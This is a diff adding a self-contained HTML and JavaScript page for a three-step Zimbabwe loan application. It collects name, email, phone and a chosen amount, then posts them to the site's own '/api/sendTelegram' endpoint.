@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Loan Application</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 30px auto;
+            background: #fff;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,.08);
+        }
+
+        h2 {
+            margin-top: 0;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 7px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 15px;
+        }
+
+        .phone-container {
+            display: flex;
+        }
+
+        .country-code {
+            padding: 13px;
+            background: #eee;
+            border: 1px solid #ccc;
+            border-right: none;
+            border-radius: 6px 0 0 6px;
+            font-weight: bold;
+        }
+
+        .phone-container input {
+            border-radius: 0 6px 6px 0;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            background: #007bff;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        button:disabled {
+            background: #999;
+            cursor: not-allowed;
+        }
+
+        .amount-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .amount-list button {
+            margin-top: 0;
+        }
+
+        .review {
+            background: #f7f7f7;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .review p {
+            margin: 10px 0;
+        }
+
+        .success {
+            color: green;
+            font-weight: bold;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <!-- STEP 1 -->
+
+    <div id="registerForm">
+
+        <h2>Step 1: Personal Information</h2>
+
+        <div class="form-group">
+            <label>First Name</label>
+            <input
+                type="text"
+                id="firstName"
+                placeholder="Enter first name"
+            >
+        </div>
+
+        <div class="form-group">
+            <label>Last Name</label>
+            <input
+                type="text"
+                id="lastName"
+                placeholder="Enter last name"
+            >
+        </div>
+
+        <div class="form-group">
+            <label>Email Address</label>
+            <input
+                type="email"
+                id="email"
+                placeholder="Enter email address"
+            >
+        </div>
+
+        <div class="form-group">
+
+            <label>Phone Number</label>
+
+            <div class="phone-container">
+
+                <div class="country-code">
+                    +263
+                </div>
+
+                <input
+                    type="tel"
+                    id="phone"
+                    placeholder="77XXXXXXX"
+                    oninput="formatPhone()"
+                >
+
+            </div>
+
+        </div>
+
+        <button onclick="registerUser()">
+            Continue
+        </button>
+
+        <p id="successMsgRegister" class="success hidden">
+            ✓ Information Saved
+        </p>
+
+    </div>
+
+
+    <!-- STEP 2 -->
+
+    <div id="loanForm" class="hidden">
+
+        <h2>Step 2: Select Loan Amount</h2>
+
+        <div
+            class="amount-list"
+            id="amountList">
+        </div>
+
+    </div>
+
+
+    <!-- STEP 3 -->
+
+    <div id="reviewForm" class="hidden">
+
+        <h2>Step 3: Review Application</h2>
+
+        <div class="review">
+
+            <p>
+                <strong>First Name:</strong>
+                <span id="reviewFirstName"></span>
+            </p>
+
+            <p>
+                <strong>Last Name:</strong>
+                <span id="reviewLastName"></span>
+            </p>
+
+            <p>
+                <strong>Email:</strong>
+                <span id="reviewEmail"></span>
+            </p>
+
+            <p>
+                <strong>Phone Number:</strong>
+                +263<span id="reviewPhone"></span>
+            </p>
+
+            <p>
+                <strong>Country:</strong>
+                Zimbabwe
+            </p>
+
+            <p>
+                <strong>Loan Amount:</strong>
+                <span id="reviewAmount"></span>
+            </p>
+
+        </div>
+
+        <button onclick="applyLoan()">
+            Apply
+        </button>
+
+    </div>
+
+</div>
+
+
+<script>
+
+let userData = {
+    firstName: "",
+    lastName: "",
+    email: "",
+    phone: "",
+    loanAmount: ""
+};
+
+
+/* ================================
+   PHONE FORMAT
+================================ */
+
+function formatPhone() {
+
+    const phoneInput =
+        document.getElementById("phone");
+
+    phoneInput.value =
+        phoneInput.value.replace(/\D/g, "");
+
+    if (phoneInput.value.length > 9) {
+
+        phoneInput.value =
+            phoneInput.value.substring(0, 9);
+    }
+}
+
+
+/* ================================
+   STEP 1
+================================ */
+
+function registerUser() {
+
+    const firstName =
+        document
+        .getElementById("firstName")
+        .value
+        .trim();
+
+    const lastName =
+        document
+        .getElementById("lastName")
+        .value
+        .trim();
+
+    const email =
+        document
+        .getElementById("email")
+        .value
+        .trim();
+
+    const phone =
+        document
+        .getElementById("phone")
+        .value
+        .trim();
+
+
+    if (
+        !firstName ||
+        !lastName ||
+        !email ||
+        !phone
+    ) {
+
+        alert(
+            "Please complete all fields."
+        );
+
+        return;
+    }
+
+
+    const emailPattern =
+        /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+
+    if (!emailPattern.test(email)) {
+
+        alert(
+            "Please enter a valid email address."
+        );
+
+        return;
+    }
+
+
+    if (!/^7\d{8}$/.test(phone)) {
+
+        alert(
+            "Please enter a valid Zimbabwe mobile number."
+        );
+
+        return;
+    }
+
+
+    userData.firstName = firstName;
+    userData.lastName = lastName;
+    userData.email = email;
+    userData.phone = phone;
+
+
+    document
+        .getElementById("successMsgRegister")
+        .classList.remove("hidden");
+
+
+    document
+        .getElementById("registerForm")
+        .classList.add("hidden");
+
+
+    document
+        .getElementById("loanForm")
+        .classList.remove("hidden");
+
+
+    loadLoanAmounts();
+}
+
+
+/* ================================
+   STEP 2
+================================ */
+
+function loadLoanAmounts() {
+
+    const amountList =
+        document.getElementById("amountList");
+
+
+    const amounts = [
+        "USD 100",
+        "USD 200",
+        "USD 300",
+        "USD 500",
+        "USD 1,000"
+    ];
+
+
+    amountList.innerHTML = "";
+
+
+    amounts.forEach(function(amount) {
+
+        const button =
+            document.createElement("button");
+
+
+        button.type = "button";
+
+        button.textContent = amount;
+
+
+        button.onclick = function() {
+
+            userData.loanAmount = amount;
+
+
+            document
+                .getElementById("loanForm")
+                .classList
+                .add("hidden");
+
+
+            document
+                .getElementById("reviewForm")
+                .classList
+                .remove("hidden");
+
+
+            document
+                .getElementById("reviewFirstName")
+                .textContent =
+                userData.firstName;
+
+
+            document
+                .getElementById("reviewLastName")
+                .textContent =
+                userData.lastName;
+
+
+            document
+                .getElementById("reviewEmail")
+                .textContent =
+                userData.email;
+
+
+            document
+                .getElementById("reviewPhone")
+                .textContent =
+                userData.phone;
+
+
+            document
+                .getElementById("reviewAmount")
+                .textContent =
+                userData.loanAmount;
+        };
+
+
+        amountList.appendChild(button);
+
+    });
+}
+
+
+/* ================================
+   STEP 3
+   SEND TO VERCEL API
+================================ */
+
+async function applyLoan() {
+
+    if (
+        !userData.firstName ||
+        !userData.lastName ||
+        !userData.email ||
+        !userData.phone ||
+        !userData.loanAmount
+    ) {
+
+        alert(
+            "Please complete all application details."
+        );
+
+        return;
+    }
+
+
+    const button =
+        document.querySelector(
+            "#reviewForm button"
+        );
+
+
+    button.disabled = true;
+
+    button.textContent =
+        "Submitting...";
+
+
+    try {
+
+        const response =
+            await fetch(
+                "/api/sendTelegram",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:
+                        JSON.stringify(userData)
+                }
+            );
+
+
+        const result =
+            await response.json();
+
+
+        if (result.success) {
+
+            alert(
+                "Application submitted successfully."
+            );
+
+
+            button.textContent =
+                "Application Submitted";
+
+
+        } else {
+
+            console.error(result);
+
+
+            alert(
+                result.message ||
+                "Unable to send application."
+            );
+
+
+            button.disabled = false;
+
+            button.textContent =
+                "Apply";
+        }
+
+
+    } catch (error) {
+
+        console.error(error);
+
+
+        alert(
+            "Connection error. Please try again."
+        );
+
+
+        button.disabled = false;
+
+        button.textContent =
+            "Apply";
+    }
+}
+
+</script>
+
+</body>
+</html>
